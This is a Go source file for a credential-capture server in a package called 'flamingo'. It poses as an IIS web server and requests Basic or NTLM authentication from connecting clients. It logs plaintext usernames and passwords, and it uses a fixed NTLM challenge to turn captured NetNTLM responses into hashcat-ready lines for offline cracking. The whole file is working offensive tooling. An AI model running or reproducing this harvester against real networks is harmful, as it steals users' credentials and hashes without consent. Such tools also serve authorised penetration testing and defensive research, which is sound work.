package flamingo

import (
	ctx "context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/audibleblink/go-ntlm/ntlm"
	log "github.com/sirupsen/logrus"
)

// NTLMChallenge is the challenge blob that Responder sends, using
// 1122334455667788 for easier offline cracking
const NTLMChallenge = "TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQL" +
	"ODgAAAA9TAE0AQgACAAYARgBUAFAAAQAWAEYAVABQAC0AVABPAE8ATABCAE8AWAAEABIAZgB0AHAA" +
	"LgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAxADYALgBmAHQAYgAuAGwAbwBjAGEAbAAFA" +
	"BIAZgB0AHAALgBsAG8AYwBhAGwAAAAAAA=="

// ConfHTTP describes the options for a HTTP service
type ConfHTTP struct {
	BindPort     uint16
	BindHost     string
	BasicRealm   string
	AuthMode     string
	RecordWriter *RecordWriter
	TLS          bool
	TLSName      string
	TLSCert      string
	TLSKey       string
	shutdown     bool
	listener     net.Listener
	server       *http.Server
	m            sync.Mutex
}

// IsShutdown checks to see if the service is shutting down
func (c *ConfHTTP) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down
func (c *ConfHTTP) Shutdown() {
	c.m.Lock()
	defer c.m.Unlock()

	if !c.shutdown {
		c.shutdown = true
		c.server.Shutdown(ctx.Background())
	}
}

// NewConfHTTP creates a default configuration for the HTTP capture server
func NewConfHTTP() *ConfHTTP {
	return &ConfHTTP{
		BindPort: 389,
		BindHost: "[::]",
	}
}

// SpawnHTTP starts a logging HTTP server
func SpawnHTTP(c *ConfHTTP) error {

	c.server = &http.Server{
		IdleTimeout:  60 * time.Second,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
		Addr:         fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
	}
	c.server.Handler = httpHandler(c)

	// Handler normal listeners
	if !c.TLS {
		listener, err := net.Listen("tcp", fmt.Sprintf("%s:%d", c.BindHost, c.BindPort))
		if err != nil {
			return fmt.Errorf("failed to listen on %s:%d (%s)", c.BindHost, c.BindPort, err)
		}
		c.listener = listener
		go startHTTP(c)
		return nil
	}

	// Handle TLS listeners
	tlsConfig := tls.Config{ServerName: c.TLSName}
	tlsConfig.Certificates = make([]tls.Certificate, 1)
	kp, err := tls.X509KeyPair([]byte(c.TLSCert), []byte(c.TLSKey))
	if err != nil {
		return fmt.Errorf("failed to load tls cert for https on %s:%d (%s)", c.BindHost, c.BindPort, err)
	}
	tlsConfig.Certificates = []tls.Certificate{kp}

	listener, err := tls.Listen("tcp", fmt.Sprintf("%s:%d", c.BindHost, c.BindPort), &tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to listen with tls on %s:%d (%s)", c.BindHost, c.BindPort, err)
	}
	c.listener = listener
	go startHTTP(c)
	return nil
}

func startHTTP(c *ConfHTTP) {
	pname := "http"
	if c.TLS {
		pname = "https"
	}
	log.Debugf("%s is listening on %s:%d", pname, c.BindHost, c.BindPort)
	err := c.server.Serve(c.listener)
	if err != nil {
		log.Debugf("http server exited with error %s", err)
	}

	return
}

func httpHandler(c *ConfHTTP) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {

		switch c.AuthMode {
		case "ntlm":
			if httpHandleNTLMAuth(c, w, r) {
				return
			}
		case "basic":
			if httpHandleBasicAuth(c, w, r) {
				return
			}
		}

		pname := "http"
		if c.TLS {
			pname = "https"
		}

		c.RecordWriter.Record(
			"access",
			pname,
			r.RemoteAddr,
			map[string]string{
				"_server":       fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
				"agent":         r.UserAgent(),
				"path":          r.RequestURI,
				"url":           fmt.Sprintf("%s://%s%s", pname, r.Host, r.RequestURI),
				"authorization": r.Header.Get("Authorization"),
			},
		)
	}
}

func httpHandleBasicAuth(c *ConfHTTP, w http.ResponseWriter, r *http.Request) bool {
	auth := strings.TrimSpace(r.Header.Get("Authorization"))
	if len(auth) == 0 {
		return false
	}

	bits := strings.SplitN(auth, " ", 2)
	if len(bits) != 2 || len(bits[0]) == 0 || len(bits[1]) == 0 {
		return false
	}

	atype := strings.ToLower(bits[0])
	if atype != "basic" {
		return false
	}

	rawAuth, err := base64.StdEncoding.DecodeString(bits[1])
	if err != nil {
		return false
	}

	bits = strings.SplitN(string(rawAuth), ":", 2)
	if len(bits) != 2 || (len(bits[0]) == 0 && len(bits[1]) == 0) {
		return false
	}

	pname := "http"
	if c.TLS {
		pname = "https"
	}

	c.RecordWriter.Record(
		"credential",
		pname,
		r.RemoteAddr,
		map[string]string{
			"_server":  fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
			"agent":    r.UserAgent(),
			"path":     r.RequestURI,
			"url":      fmt.Sprintf("%s://%s%s", pname, r.Host, r.RequestURI),
			"username": bits[0],
			"password": bits[1],
			"method":   "basic",
		},
	)

	return true
}

func httpHandleNTLMAuth(c *ConfHTTP, w http.ResponseWriter, r *http.Request) (ok bool) {

	headers := map[string]string{
		"Connection": "Keep-Alive",
		"Keep-Alive": "timeout=5, max=100",
		"Server":     "Microsoft-IIS/7.5",
	}

	for k, v := range headers {
		w.Header().Set(k, v)
	}

	if r.Method == "OPTIONS" {
		// OPTIONS indicates a possible WebDAV client
		w.Header().Set("Allow", "OPTIONS,GET,HEAD,POST,PUT,DELETE,TRACE,"+
			"PROPFIND,PROPPATCH,MKCOL,COPY,MOVE,LOCK,UNLOCK")

	} else if r.Method == "GET" || r.Method == "PROPFIND" {
		// GETs for standard HTTP client or PROPFIND for stage 2 WebDAV

		authHeader := ""
		if r.Header["Authorization"] != nil {
			authHeader = r.Header["Authorization"][0]
		}

		switch ntlmType(authHeader) {
		case -1:
			w.WriteHeader(404)
		case 0:
			w.Header().Set("WWW-Authenticate", "NTLM")
			w.WriteHeader(401)
		case 1:
			w.Header().Set("WWW-Authenticate", fmt.Sprintf("NTLM %s", NTLMChallenge))
			w.WriteHeader(401)
		case 3:
			ntlmBytes, err := ntlmHeaderBytes(authHeader)
			if err != nil {
				w.WriteHeader(404)
				return
			}
			hashType := ntlmGetHashType(authHeader)
			netNTLMResponse, err := ntlm.ParseAuthenticateMessage(ntlmBytes, hashType)
			if err != nil {
				w.WriteHeader(404)
				return
			}

			pname := "http"
			if c.TLS {
				pname = "https"
			}
			c.RecordWriter.Record(
				"credential",
				pname,
				r.RemoteAddr,
				map[string]string{
					"_server":  fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
					"agent":    r.UserAgent(),
					"path":     r.RequestURI,
					"url":      fmt.Sprintf("%s://%s%s", pname, r.Host, r.RequestURI),
					"username": netNTLMResponse.UserName.String(),
					"hashcat":  ntlmToHashcat(netNTLMResponse, hashType),
					"method":   "NTLMSSP",
				},
			)
			ok = true

		}
	} else {
		w.WriteHeader(404)
	}
	return
}

func ntlmGetHashType(header string) int {
	netNTLMMessageBytes, err := ntlmHeaderBytes(header)
	if err != nil {
		return -1
	}

	hashSize := netNTLMMessageBytes[22]
	if hashSize == 24 {
		return 1
	}
	return 2
}

func ntlmType(header string) int {
	netNTLMMessageBytes, err := ntlmHeaderBytes(header)
	if err != nil {
		return -1
	}

	size := len(netNTLMMessageBytes)
	switch {
	case size == 0:
		return 0
	case size <= 64:
		return 1
	default:
		return 3
	}
}

func ntlmToHashcat(h *ntlm.AuthenticateMessage, ntlmVer int) (out string) {
	template := "%s::%s:%s:%s:%s"
	un := h.UserName.String()
	dn := h.DomainName.String()
	ws := h.Workstation.String()
	ch := "1122334455667788"

	if ntlmVer == 1 {
		lm := h.LmChallengeResponse.String()
		nt := h.NtlmV1Response.String()
		out = fmt.Sprintf(template, un, ws, lm, nt, ch)
	} else {
		v2 := h.NtChallengeResponseFields.String()
		if len(v2) < 64 {
			v2 = "0000000000000000000000000000000000000000000000000000000000000000"
		}
		lm := v2[0:32]
		nt := v2[32 : len(v2)-1]
		out = fmt.Sprintf(template, un, dn, ch, lm, nt)
	}
	return
}

func ntlmHeaderBytes(header string) ([]byte, error) {
	b64 := strings.TrimPrefix(header, "NTLM ")
	netNTLMMessageBytes, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return netNTLMMessageBytes, err
	}
	return netNTLMMessageBytes, err
}
